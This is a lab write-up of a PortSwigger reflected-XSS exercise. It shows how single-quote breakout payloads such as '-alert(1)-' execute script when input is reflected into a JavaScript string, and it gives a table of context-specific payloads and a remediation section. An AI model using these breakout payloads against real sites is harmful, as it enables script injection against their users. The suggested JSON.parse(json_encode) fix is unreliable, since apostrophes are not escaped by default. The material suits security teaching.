# PortSwigger — Reflected XSS into a JavaScript String with Angle Brackets HTML-Encoded

`Web Security Academy` • `Cross-Site Scripting` • `Apprentice`

## TL;DR

The search functionality reflects user input directly inside a JavaScript string literal in the page source. Angle brackets are HTML-encoded, blocking tag injection. However, single quotes are not escaped, allowing an attacker to break out of the string context, execute arbitrary JavaScript, and re-enter the string cleanly using arithmetic operators. The lab is solved by submitting `'-alert(1)-'` in the search field, which causes `alert()` to execute immediately on page load.

**Lab URL:** `https://0a5e0069032572338299924d00990052.web-security-academy.net/`

---

## Challenge Description

> This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

**Context:**
- Difficulty: **Apprentice**
- Category: **Cross-Site Scripting — Reflected**
- Goal: Break out of a JavaScript string literal and call `alert(1)`

---

## Recon

### Step 1 — Identify where input is reflected

Submit an arbitrary search term (e.g. `hello`) and view the page source with `Ctrl+U`. The input is reflected inside an inline `<script>` block:

```javascript
<script>
    var searchTerms = 'hello';
    document.write('<img src="/resources/images/tracker.gif?searchTerms=' + encodeURIComponent(searchTerms) + '">');
</script>
```

The search term is embedded directly as the value of a JavaScript string variable, delimited by **single quotes**.

### Step 2 — Test angle bracket encoding

Submit a standard XSS probe:

```
<script>alert(1)</script>
```

Inspect the source:

```javascript
var searchTerms = '&lt;script&gt;alert(1)&lt;/script&gt;';
```

Angle brackets are HTML-encoded. Tag injection is blocked entirely.

### Step 3 — Test for single quote escaping

Submit a single quote:

```
'
```

Inspect the source:

```javascript
var searchTerms = ''';
```

The single quote is **not escaped**. It breaks the string literal and produces a JavaScript syntax error — confirming that breaking out of the string context is possible.

---

## Understanding the Vulnerability

The server-side template embeds the search term into JS like this:

```javascript
var searchTerms = '[USER INPUT]';
```

| Character | Encoded / Escaped? | Consequence |
|---|---|---|
| `<` | ✅ Yes → `&lt;` | Cannot inject HTML tags |
| `>` | ✅ Yes → `&gt;` | Cannot inject HTML tags |
| `'` | ❌ No | Can break out of the JS string |
| `"` | ❌ No | No impact here — delimiter is `'` |
| `\` | ❌ No | Cannot neutralise the breakout |

Because `'` is not escaped to `\'`, an attacker can terminate the string literal early and inject arbitrary JavaScript expressions directly into the script block.

### Why the JS execution context matters

When XSS occurs inside a `<script>` block, the browser is already in JavaScript parsing mode. Unlike HTML tag injection (which requires `<` and `>`), breaking out of a JS string only requires the string delimiter character — in this case `'`. HTML-encoding angle brackets provides zero protection against this attack.

---

## Exploitation

### The Payload

```
'-alert(1)-'
```

### What it produces in the source

```javascript
var searchTerms = ''-alert(1)-'';
```

### Why this payload is syntactically valid JavaScript

Breaking down the generated expression step by step:

```
''        → empty string literal (closed by the injected ')
-         → subtraction operator
alert(1)  → function call — executes alert, returns undefined
-         → subtraction operator
''        → empty string literal (opened by the closing ' of the original template)
;         → end of statement
```

JavaScript evaluates `'' - alert(1) - ''` as an arithmetic expression. The `-` operator coerces its operands, `alert(1)` is called as part of the evaluation, and the overall expression resolves to `NaN` — which is silently assigned to `searchTerms`. No syntax error, no console warning, clean execution.

### Step-by-step

1. Navigate to the lab URL
2. Type the following payload into the search field:
   ```
   '-alert(1)-'
   ```
3. Click **Search**
4. The page loads, the inline script executes, `alert(1)` fires → **lab solved** ✅

### Execution Flow

```
Attacker submits: '-alert(1)-'
        ↓
Server reflects into JS: var searchTerms = ''-alert(1)-'';
        ↓
Browser enters <script> block — already in JS parsing mode
        ↓
First ' closes the string literal opened by the template
        ↓
-alert(1)- is evaluated as an arithmetic expression
        ↓
alert(1) is called as part of operand evaluation
        ↓
Last ' reopens a string, ; closes the statement — no syntax error
        ↓
LAB SOLVED ✅
```

---

## Alternative Payload

A cleaner variant that explicitly terminates the statement and comments out the remainder of the original line:

```
';alert(1)//
```

Produces:

```javascript
var searchTerms = '';alert(1)//'';
```

| Fragment | Role |
|---|---|
| `'` | Closes the string literal |
| `;` | Terminates the `var` statement |
| `alert(1)` | New statement — executes immediately |
| `//` | Line comment — neutralises the trailing `'';` from the template |

Both payloads achieve the same result. The `'-alert(1)-'` approach is more elegant as it keeps the overall expression syntactically valid without needing a comment. The `';alert(1)//` approach is more explicit and easier to read.

---

## XSS Context Comparison

| Injection context | Angle brackets needed? | Key character to escape | Viable payload |
|---|---|---|---|
| HTML tag body | ✅ Yes | `<`, `>` | `<img src=x onerror=alert(1)>` |
| HTML attribute value | ❌ No | `"` or `'` | `" onmouseover="alert(1)` |
| JavaScript string — single quoted | ❌ No | `'` | `'-alert(1)-'` |
| JavaScript string — double quoted | ❌ No | `"` | `"-alert(1)-"` |
| JavaScript string — backtick | ❌ No | `` ` `` | `` `-alert(1)-` `` |

---

## Key Takeaways

- **Context determines the required encoding** — HTML-encoding `<` and `>` is correct for HTML contexts but provides zero protection when input is reflected inside a JavaScript string literal
- **Each injection context has its own dangerous character** — for JS strings delimited by `'`, the critical character to escape is `\'`; for `"`, it is `\"`
- **Arithmetic operators are a clean breakout technique** — using `-` on both sides of the payload keeps the JS expression syntactically valid and avoids triggering syntax errors or browser console warnings
- **The fix:** when reflecting user input inside a JavaScript string, escape the string delimiter with a backslash (`'` → `\'`, `"` → `\"`), and also escape `\` itself (`\` → `\\`) to prevent backslash injection from neutralising the escaping. Better yet, JSON-encode the value: `var searchTerms = JSON.parse('<?= json_encode($input) ?>');` — this handles all edge cases automatically

---

## References

- [PortSwigger — Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)
- [PortSwigger — XSS into JavaScript contexts](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-into-javascript)
- [PortSwigger — XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [OWASP — XSS Prevention Cheat Sheet — Rule 3 (JavaScript Escaping)](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#rule-3-javascript-escape-before-inserting-untrusted-data-into-javascript-data-values)
- [MDN — JavaScript Lexical Grammar — String literals](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Lexical_grammar#string_literals)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)